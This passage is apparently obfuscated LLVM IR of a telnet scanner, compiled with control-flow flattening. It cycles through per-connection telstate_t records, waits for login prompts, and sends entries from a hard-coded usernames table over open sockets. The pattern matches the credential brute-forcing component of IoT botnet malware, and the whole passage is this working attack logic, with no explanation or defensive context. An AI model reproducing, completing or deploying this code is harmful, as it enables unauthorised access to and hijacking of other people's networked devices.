  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %341, i32 0, i32 0
  %343 = load i32, i32* %342, align 16
  %344 = call i32 (i32, i32, ...) @fcntl(i32 %343, i32 3, i8* null)
  %345 = and i32 %344, -2049
  %346 = call i32 (i32, i32, ...) @fcntl(i32 %338, i32 4, i32 %345)
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %.reload146 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload146, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 6
  store i32 0, i32* %350, align 4
  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %.reload145 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload145, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 7
  store i16 0, i16* %354, align 16
  %355 = load i32, i32* %2, align 4
  %356 = sext i32 %355 to i64
  %.reload144 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload144, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 8
  %359 = load i8*, i8** %358, align 8
  call void @llvm.memset.p0i8.i64(i8* %359, i8 0, i64 1024, i32 1, i1 false)
  %360 = load i32, i32* %2, align 4
  %361 = sext i32 %360 to i64
  %.reload143 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload143, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 2
  store i8 2, i8* %363, align 8
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  store i32 -1841942273, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = load i32, i32* %3, align 4
  %367 = icmp eq i32 %366, -1
  %368 = select i1 %367, i32 -2022673136, i32 1545987721
  store i32 %368, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i32, i32* %2, align 4
  %371 = sext i32 %370 to i64
  %.reload142 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload142, i64 %371
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %372, i32 0, i32 0
  %374 = load i32, i32* %373, align 16
  %375 = call i32 @sclose(i32 %374)
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %.reload141 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload141, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 2
  store i8 0, i8* %379, align 8
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %.reload140 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload140, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 3
  store i8 1, i8* %383, align 1
  store i32 1545987721, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  store i32 -1841942273, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i32, i32* %2, align 4
  %387 = sext i32 %386 to i64
  %.reload139 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload139, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 6
  %390 = load i32, i32* %389, align 4
  %391 = add i32 %390, 5
  %392 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %393 = icmp ult i32 %391, %392
  %394 = select i1 %393, i32 -1475217192, i32 -1483244655
  store i32 %394, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i32, i32* %2, align 4
  %397 = sext i32 %396 to i64
  %.reload138 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload138, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 0
  %400 = load i32, i32* %399, align 16
  %401 = call i32 @sclose(i32 %400)
  %402 = load i32, i32* %2, align 4
  %403 = sext i32 %402 to i64
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload137, i64 %403
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %404, i32 0, i32 2
  store i8 0, i8* %405, align 8
  %406 = load i32, i32* %2, align 4
  %407 = sext i32 %406 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 3
  store i8 1, i8* %409, align 1
  store i32 -1483244655, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  %412 = load i32, i32* %2, align 4
  %413 = sext i32 %412 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %414, i32 0, i32 6
  %416 = load i32, i32* %415, align 4
  %417 = icmp eq i32 %416, 0
  %418 = select i1 %417, i32 -570672146, i32 -1766943652
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %421 = load i32, i32* %2, align 4
  %422 = sext i32 %421 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %422
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %423, i32 0, i32 6
  store i32 %420, i32* %424, align 4
  store i32 -1766943652, i32* %switchVar
  br label %loopEnd

; <label>:425:                                    ; preds = %loopEntry
  %426 = load i32, i32* %2, align 4
  %427 = sext i32 %426 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %427
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %428, i32 0, i32 8
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @matchPrompt(i8* %430)
  %432 = icmp ne i32 %431, 0
  %433 = select i1 %432, i32 1426108293, i32 -738313287
  store i32 %433, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i32, i32* %2, align 4
  %436 = sext i32 %435 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 2
  store i8 7, i8* %438, align 8
  store i32 -738313287, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 0
  %444 = load i32, i32* %443, align 16
  %445 = load i32, i32* %2, align 4
  %446 = sext i32 %445 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 8
  %449 = load i8*, i8** %448, align 8
  %450 = load i32, i32* %2, align 4
  %451 = sext i32 %450 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %451
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %452, i32 0, i32 7
  %454 = load i16, i16* %453, align 16
  %455 = zext i16 %454 to i32
  %456 = call i32 @readUntil(i32 %444, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %449, i32 1024, i32 %455)
  %457 = icmp ne i32 %456, 0
  %458 = select i1 %457, i32 1240803789, i32 -1305244304
  store i32 %458, i32* %switchVar
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = load i32, i32* %2, align 4
  %461 = sext i32 %460 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %461
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %462, i32 0, i32 6
  store i32 0, i32* %463, align 4
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 7
  store i16 0, i16* %467, align 16
  %468 = load i32, i32* %2, align 4
  %469 = sext i32 %468 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 8
  %472 = load i8*, i8** %471, align 8
  call void @llvm.memset.p0i8.i64(i8* %472, i8 0, i64 1024, i32 1, i1 false)
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 2
  store i8 3, i8* %476, align 8
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  %478 = load i32, i32* %2, align 4
  %479 = sext i32 %478 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 16
  %483 = load i32, i32* %2, align 4
  %484 = sext i32 %483 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %484
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %485, i32 0, i32 8
  %487 = load i8*, i8** %486, align 8
  %488 = load i32, i32* %2, align 4
  %489 = sext i32 %488 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %489
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %490, i32 0, i32 7
  %492 = load i16, i16* %491, align 16
  %493 = zext i16 %492 to i32
  %494 = call i32 @readUntil(i32 %482, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %487, i32 1024, i32 %493)
  %495 = icmp ne i32 %494, 0
  %496 = select i1 %495, i32 1698613368, i32 2135704956
  store i32 %496, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = load i32, i32* %2, align 4
  %499 = sext i32 %498 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 6
  store i32 0, i32* %501, align 4
  %502 = load i32, i32* %2, align 4
  %503 = sext i32 %502 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 7
  store i16 0, i16* %505, align 16
  %506 = load i32, i32* %2, align 4
  %507 = sext i32 %506 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 8
  %510 = load i8*, i8** %509, align 8
  call void @llvm.memset.p0i8.i64(i8* %510, i8 0, i64 1024, i32 1, i1 false)
  %511 = load i32, i32* %2, align 4
  %512 = sext i32 %511 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %512
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %513, i32 0, i32 2
  store i8 3, i8* %514, align 8
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = load i32, i32* %2, align 4
  %517 = sext i32 %516 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 0
  %520 = load i32, i32* %519, align 16
  %521 = load i32, i32* %2, align 4
  %522 = sext i32 %521 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 8
  %525 = load i8*, i8** %524, align 8
  %526 = load i32, i32* %2, align 4
  %527 = sext i32 %526 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 7
  %530 = load i16, i16* %529, align 16
  %531 = zext i16 %530 to i32
  %532 = call i32 @readUntil(i32 %520, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %525, i32 1024, i32 %531)
  %533 = icmp ne i32 %532, 0
  %534 = select i1 %533, i32 -352066622, i32 684485744
  store i32 %534, i32* %switchVar
  br label %loopEnd

; <label>:535:                                    ; preds = %loopEntry
  %536 = load i32, i32* %2, align 4
  %537 = sext i32 %536 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 6
  store i32 0, i32* %539, align 4
  %540 = load i32, i32* %2, align 4
  %541 = sext i32 %540 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 7
  store i16 0, i16* %543, align 16
  %544 = load i32, i32* %2, align 4
  %545 = sext i32 %544 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %545
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %546, i32 0, i32 8
  %548 = load i8*, i8** %547, align 8
  call void @llvm.memset.p0i8.i64(i8* %548, i8 0, i64 1024, i32 1, i1 false)
  %549 = load i32, i32* %2, align 4
  %550 = sext i32 %549 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %550
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %551, i32 0, i32 2
  store i8 5, i8* %552, align 8
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:553:                                    ; preds = %loopEntry
  %554 = load i32, i32* %2, align 4
  %555 = sext i32 %554 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 8
  %558 = load i8*, i8** %557, align 8
  %559 = call i64 @strlen(i8* %558) #10
  %560 = trunc i64 %559 to i16
  %561 = load i32, i32* %2, align 4
  %562 = sext i32 %561 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 7
  store i16 %560, i16* %564, align 16
  store i32 -73838993, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  store i32 -1968577160, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  store i32 1080833952, i32* %switchVar
  br label %loopEnd

; <label>:567:                                    ; preds = %loopEntry
  %568 = load i32, i32* %2, align 4
  %569 = sext i32 %568 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 6
  %572 = load i32, i32* %571, align 4
  %573 = add i32 %572, 20
  %574 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %575 = icmp ult i32 %573, %574
  %576 = select i1 %575, i32 -1637451625, i32 -2119976115
  store i32 %576, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = load i32, i32* %2, align 4
  %579 = sext i32 %578 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 0
  %582 = load i32, i32* %581, align 16
  %583 = call i32 @sclose(i32 %582)
  %584 = load i32, i32* %2, align 4
  %585 = sext i32 %584 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 2
  store i8 0, i8* %587, align 8
  %588 = load i32, i32* %2, align 4
  %589 = sext i32 %588 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 3
  store i8 1, i8* %591, align 1
  store i32 -2119976115, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:593:                                    ; preds = %loopEntry
  %594 = load i32, i32* %2, align 4
  %595 = sext i32 %594 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %595
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %596, i32 0, i32 0
  %598 = load i32, i32* %597, align 16
  %599 = load i32, i32* %2, align 4
  %600 = sext i32 %599 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 4
  %603 = load i8, i8* %602, align 2
  %604 = zext i8 %603 to i64
  %605 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %604
  %606 = load i8*, i8** %605, align 8
  %607 = load i32, i32* %2, align 4
  %608 = sext i32 %607 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %608
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %609, i32 0, i32 4
  %611 = load i8, i8* %610, align 2
  %612 = zext i8 %611 to i64
  %613 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %612
  %614 = load i8*, i8** %613, align 8
  %615 = call i64 @strlen(i8* %614) #10
  %616 = call i64 @send(i32 %598, i8* %606, i64 %615, i32 16384)
  %617 = icmp slt i64 %616, 0
  %618 = select i1 %617, i32 -1582709377, i32 1301022082
  store i32 %618, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = load i32, i32* %2, align 4
  %621 = sext i32 %620 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 0
  %624 = load i32, i32* %623, align 16
  %625 = call i32 @sclose(i32 %624)
  %626 = load i32, i32* %2, align 4
  %627 = sext i32 %626 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 2
  store i8 0, i8* %629, align 8
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 3
  store i8 1, i8* %633, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = load i32, i32* %2, align 4
  %636 = sext i32 %635 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %637, i32 0, i32 0
  %639 = load i32, i32* %638, align 16
  %640 = call i64 @send(i32 %639, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i64 2, i32 16384)
  %641 = icmp slt i64 %640, 0
  %642 = select i1 %641, i32 -1432798926, i32 -1755587484
  store i32 %642, i32* %switchVar
  br label %loopEnd

; <label>:643:                                    ; preds = %loopEntry
  %644 = load i32, i32* %2, align 4
  %645 = sext i32 %644 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %645
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %646, i32 0, i32 0
  %648 = load i32, i32* %647, align 16
  %649 = call i32 @sclose(i32 %648)
  %650 = load i32, i32* %2, align 4
  %651 = sext i32 %650 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 2
  store i8 0, i8* %653, align 8
  %654 = load i32, i32* %2, align 4
  %655 = sext i32 %654 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %655
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %656, i32 0, i32 3
  store i8 1, i8* %657, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:658:                                    ; preds = %loopEntry
  %659 = load i32, i32* %2, align 4
  %660 = sext i32 %659 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %660
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %661, i32 0, i32 2
  store i8 4, i8* %662, align 8
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 6
  %668 = load i32, i32* %667, align 4
  %669 = icmp eq i32 %668, 0
  %670 = select i1 %669, i32 1547159676, i32 262431857
  store i32 %670, i32* %switchVar
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  %672 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %673 = load i32, i32* %2, align 4
  %674 = sext i32 %673 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 6
  store i32 %672, i32* %676, align 4
  store i32 262431857, i32* %switchVar
  br label %loopEnd

; <label>:677:                                    ; preds = %loopEntry
  %678 = load i32, i32* %2, align 4
  %679 = sext i32 %678 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %679
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %680, i32 0, i32 8
  %682 = load i8*, i8** %681, align 8
  %683 = call i32 @matchPrompt(i8* %682)
  %684 = icmp ne i32 %683, 0
  %685 = select i1 %684, i32 -1058048520, i32 -1557753996
  store i32 %685, i32* %switchVar
  br label %loopEnd

; <label>:686:                                    ; preds = %loopEntry
  %687 = load i32, i32* %2, align 4
  %688 = sext i32 %687 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 2
  store i8 7, i8* %690, align 8
  store i32 -1557753996, i32* %switchVar
  br label %loopEnd

; <label>:691:                                    ; preds = %loopEntry
  %692 = load i32, i32* %2, align 4
  %693 = sext i32 %692 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %693
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %694, i32 0, i32 0
  %696 = load i32, i32* %695, align 16
  %697 = load i32, i32* %2, align 4
  %698 = sext i32 %697 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 8
  %701 = load i8*, i8** %700, align 8
  %702 = load i32, i32* %2, align 4
  %703 = sext i32 %702 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %703
